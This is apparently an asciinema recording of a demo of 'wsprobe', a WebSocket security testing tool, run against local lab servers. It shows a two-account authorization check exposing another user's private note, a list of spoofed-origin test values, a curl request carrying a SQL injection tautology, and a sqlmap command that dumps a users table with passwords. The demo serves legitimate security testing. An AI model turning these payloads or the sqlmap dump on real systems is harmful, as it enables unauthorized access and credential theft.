{"version": 2, "width": 132, "height": 44}
[0.6, "o", "\u001b[3J\u001b[H\u001b[2J"]
[2.6, "o", "\u001b[1;35m  wsprobe \u2014 a WebSocket security review toolkit\u001b[0m\r\n  It opens its own authenticated socket and reports observations, never verdicts.\r\n"]
[4.9, "o", "\r\n\u001b[1;36m\u258c Scene 1 \u2014 the differentiator: two-account authorization diff (BOLA)\u001b[0m\r\n"]
[5.5, "o", "  Same frame, two identities. Identical private replies = the server never re-bound the user.\r\n"]
[6.8, "o", "\u001b[1;32m$\u001b[0m uv run wsprobe diff /tmp/fx.yaml --frame '{\"type\":\"read_note\",\"owner\":\"bob\"}' --token-a /tmp/a.tok --token-b /tmp/b.tok --name-a alice --name-b bob\r\n"]
[7.4, "o", "reading: same-across-identities\r\n  alice reply: {\"type\": \"note\", \"owner\": \"bob\", \"content\": \"bob private note: brokerage password hint is the dog's name\", \"cid\": 1}\r\n  bob reply: {\"type\": \"note\", \"owner\": \"bob\", \"content\": \"bob private note: brokerage password hint is the dog's name\", \"cid\": 1}\r\n"]
[9.0, "o", "  \u001b[1;31m\u2192 same-across-identities: alice read bob's private note. Deterministic, not a guess.\u001b[0m\r\n"]
[11.3, "o", "\r\n\u001b[1;36m\u258c Control \u2014 the same tool against a correctly-secured socket\u001b[0m\r\n"]
[12.6, "o", "\u001b[1;32m$\u001b[0m uv run wsprobe matrix /tmp/ctl.yaml --expected-identity alice --foreign-identity bob\r\n"]
[13.2, "o", "unauth-upgrade             observed=rejected                           [control-present] {'upgraded': False, 'error': 'http-403'}\r\nexpired-token              observed=not-supplied                       [inconclusive] {'note': 'operator did not supply a token'}\r\nforeign-token              observed=not-supplied                       [inconclusive] {'note': 'operator did not supply a token'}\r\norigin-stripped            observed=rejected                           [control-present] {'origin': None, 'upgraded': False}\r\norigin-null                observed=rejected                           [control-present] {'origin': 'null', 'upgraded': False}\r\norigin-sibling             observed=rejected                           [control-present] {'origin': 'https://evil.127.0.0.1', 'upgraded': False}\r\norigin-bypass              observed=rejected                           [control-present] {'origin': 'https://127.0.0.1.attacker.test', 'upgraded': False}\r\norigin-bypass              observed=rejected                           [cont"]
[13.8, "o", "rol-present] {'origin': 'https://attacker-127.0.0.1', 'upgraded': False}\r\n"]
[14.4, "o", "origin-bypass              observed=rejected                           [control-present] {'origin': 'https://127.0.0.1evil.test', 'upgraded': False}\r\nno-auth-control-frame      observed=upgrade-refused                    [control-present] {'error': 'http-403'}\r\ncross-user-handshake       observed=upgrade-refused                    [control-present] {'url_identity': 'bob', 'error': 'http-403'}\r\n"]
[16.0, "o", "  \u001b[1;32m\u2192 no insecure-shape anywhere: rejected upgrades, refused origins. Controls hold.\u001b[0m\r\n"]
[18.3, "o", "\r\n\u001b[1;36m\u258c Scene 2 \u2014 the bridge: an HTTP tool reaches a WebSocket frame field\u001b[0m\r\n"]
[18.9, "o", "  A SQL tautology, sent as an HTTP request, carried onto the socket by wsprobe:\r\n"]
[20.2, "o", "\u001b[1;32m$\u001b[0m curl -s -G 'http://127.0.0.1:8082/' --data-urlencode \"fuzz=x' OR '1'='1' -- \"\r\n"]
[20.8, "o", "{\"type\": \"login.ok\", \"user\": \"alice\", \"cid\": 1}"]
[22.4, "o", "  \u001b[1;31m\u2192 login.ok: the injection reached the SQL sink through the frame.\u001b[0m\r\n"]
[23.0, "o", "\r\n  sqlmap, speaking only HTTP, then confirmed and dumped through the same bridge:\r\n"]
[24.3, "o", "\u001b[1;32m$\u001b[0m sqlmap -u http://127.0.0.1:8082/?fuzz=alice --batch --dbms sqlite --dump -T users\r\n"]
[24.9, "o", "Table: users\r\n[2 entries]\r\n+------------+------------+----------+\r\n| secret     | password   | username |\r\n+------------+------------+----------+\r\n| flag-alice | wonderland | alice    |\r\n| flag-bob   | builder    | bob      |\r\n"]
[25.5, "o", "\r\n"]
[27.8, "o", "\u001b[1;36m\u258c Also tested against OWASP Juice Shop (Socket.IO) and OWASP DVWS \u2014 see docs/validation.md\u001b[0m\r\n"]
[29.4, "o", "\r\n\u001b[1;35m  Observations, never verdicts. Reproduce before you report.\u001b[0m\r\n"]
